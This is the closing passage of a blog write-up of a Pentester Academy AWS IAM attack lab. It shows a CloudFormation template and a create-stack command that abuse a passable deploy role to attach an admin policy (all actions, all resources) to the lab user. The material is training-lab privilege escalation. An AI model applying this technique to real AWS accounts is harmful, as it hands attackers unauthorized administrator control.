        </span><span class="s2">"iam:PutUserPolicy"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Therefore, the CFN stack would be able to add an inline policy for a user. So, a malicious template is created as follows →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Resources"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"tanqtemplate"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AWS::IAM::Policy"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Properties"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="p">{</span><span class="w">
              </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
              </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="p">,</span><span class="w">
              </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
            </span><span class="p">}</span><span class="w">
          </span><span class="p">]</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"Users"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="s2">"student"</span><span class="w">
        </span><span class="p">],</span><span class="w">
        </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"cfn_admin_policy_via_exploit"</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This is then passed to the command used to create a CFN stack as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>awsn cloudformation create-stack <span class="se">\</span>
<span class="nt">--role-arn</span> <span class="s2">"arn:aws:iam::896825229505:role/lab12CFDeployRole"</span> <span class="se">\</span>
<span class="nt">--template-body</span> file://template.json <span class="nt">--stack-name</span> <span class="s2">"pass-role-exploit-cfn"</span> <span class="se">\</span>
<span class="nt">--capabilities</span> <span class="s2">"CAPABILITY_NAMED_IAM"</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">CAPABILITY_NAMED_IAM</code> capability must be passed since the template is making changes to the account using a policy which is custom and thus, “named”. This will create the stack and the creation or created status can be monitored by using the following command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># just describe</span>
awsn cloudformation describe-stacks <span class="nt">--stack-name</span> <span class="s2">"pass-role-exploit-cfn"</span>

<span class="c"># get events</span>
awsn cloudformation describe-stack-events <span class="nt">--stack-name</span> <span class="s2">"pass-role-exploit-cfn"</span>
</pre></table></code></div></div><p>Once this is created, the policy takes effect and the inline policies will show the new policy for <code class="language-plaintext highlighter-rouge">student</code> which grants it administrator privileges. This solves the lab.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/aws-labs/">AWS Labs</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/aws/" class="post-tag no-text-decoration" >aws</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/pentester-academy/" class="post-tag no-text-decoration" >pentester-academy</a> <a href="/blog/tags/iam/" class="post-tag no-text-decoration" >iam</a> <a href="/blog/tags/security/" class="post-tag no-text-decoration" >security</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Pentester%20Academy%20AWS%20IAM%20Attack%20Lab%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-iam%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Pentester%20Academy%20AWS%20IAM%20Attack%20Lab%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-iam%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-iam%2F&text=Pentester%20Academy%20AWS%20IAM%20Attack%20Lab%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fpentester-academy-aws-iam%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/gha-notif/">Custom GitHub WebHook Notifications via GitHub Actions</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-npm/">Reverse Proxy in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/go-coding/">The Way to Go(lang)</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgetlord/">Expense Tracking in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-fusion/">Leantime in Home Lab</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/pentester-academy-aws-s3/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1651129200" data-df="ll" > Apr 28, 2022 </time><h4 class="pt-0 my-2">Pentester Academy AWS S3 Attack Lab</h4><div class="text-muted"><p>Enumeration List buckets and get region for bucket → 1 2 3 4 5 # List buckets using s3api awsn s3api list-buckets | jq &#39;.Buckets[] | .Name&#39; | tr -d &quot;\&quot;&quot; # Get region for bucket a...</p></div></div></a></article><article class="col"> <a href="/blog/posts/cloudfoxable/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1687731720" data-df="ll" > Jun 25, 2023 </time><h4 class="pt-0 my-2">Cloudfoxable</h4><div class="text-muted"><p>Checkout the challenges over at GitHub. Setup &amp;amp; First Flag My initial setup starts with getting into my containerized security toolkit. From there, set up a sandbox account in the default org...</p></div></div></a></article><article class="col"> <a href="/blog/posts/flaws-2-attacker/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1683956520" data-df="ll" > May 13, 2023 </time><h4 class="pt-0 my-2">flAWS 2 - Attacker</h4><div class="text-muted"><p>Level 1 The problem statement is to enter a correct pin code on a website that is 100 digits long. The first thing to do is to look at the HTML source, where the form that takes the input sub...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/homelab-snapdrop-local/" class="btn btn-outline-primary" aria-label="Older" ><p>SnapDrop Local Container in Home Lab</p></a> <a href="/blog/posts/pentester-academy-aws-s3/" class="btn btn-outline-primary" aria-label="Newer" ><p>Pentester Academy AWS S3 Attack Lab</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.2.4" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
